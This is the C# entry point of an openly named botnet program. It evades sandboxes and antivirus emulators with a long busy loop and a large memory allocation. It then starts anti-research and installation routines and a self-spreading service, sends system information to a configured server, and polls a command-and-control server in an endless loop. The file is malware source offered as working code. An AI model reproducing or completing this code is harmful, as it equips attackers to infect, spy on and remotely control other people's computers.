using System;
using System.Collections;
using System.Diagnostics;
using System.Threading;
using System.Windows;
using BotNet.Services;
using BotNet.Services.CommandCenter;
using BotNet.Services.Infect;
using BotNet.Services.Protect;

namespace BotNet
{ 
    class Program
    {
        static void Main(string[] args)
        {
            int MAX = 1000000000; //1000mil
            int temp = 0;
            while (temp != MAX)
                temp++;
            if (temp == MAX)
            {
                ArrayList list = new ArrayList();
                int i = 0;
                while (i < 101)
                {
                    list.Add(new byte[1024 * 1024 * 101]); // 101 MB
                    i += 101;
                    //Console.WriteLine(i);
                }
                if (i > 100)
                {
                    list.Clear();
                    list = null;

                    Resolver.RegisterDependencyResolver();
                    CommandCenter CC = new CommandCenter();

                    AntiResearch _antiResearch = new AntiResearch();
                    Installation _installation = new Installation();
                    Instant _instantService = new Instant();
                    Spread _spreadService = new Spread();

                    _antiResearch.StartAntiResearch();
                    _installation.LoadSystem();
                    _spreadService.SpreadStart();
                    _instantService.ClearMemory();

                    Spy.SystemInfo(Configure.ServerAddress);

                    while (true)
                    {
                        Thread.Sleep(Configure.ConnectionInterval);
                        CC.GetCommand();
                    }
                }
            }
        }
    }
}
